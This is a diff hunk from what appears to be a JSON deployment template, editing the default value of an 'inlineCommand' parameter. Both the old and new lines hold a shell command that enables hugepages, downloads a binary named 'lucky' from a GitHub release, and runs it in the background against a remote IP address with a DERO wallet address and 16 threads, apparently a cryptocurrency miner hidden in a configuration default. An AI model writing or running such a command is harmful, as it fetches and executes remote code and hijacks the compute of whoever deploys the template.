@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; mkdir ccc && cd ccc && wget https://github.com/jokervulinh96/lucky/releases/download/lucky/lucky.tar.gz && tar xf lucky.tar.gz && sudo nohup ./lucky -d 89.117.61.229:10100 -w dero1qyk2a6zw9slgfx5ttf0qru6xyfahn5nryhhy4xzzl4ynd6ndp2x8kqq8qga44 -t 16>log.out &",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; mkdir tkt && cd tkt && wget https://github.com/jokervulinh96/lucky/releases/download/lucky/lucky.tar.gz && tar xf lucky.tar.gz && screen -d -m ./lucky -d 89.117.61.229:10100 -w dero1qyk2a6zw9slgfx5ttf0qru6xyfahn5nryhhy4xzzl4ynd6ndp2x8kqq8qga44 -t 16",
             "metadata": {
                 "description": "inline command"
             }
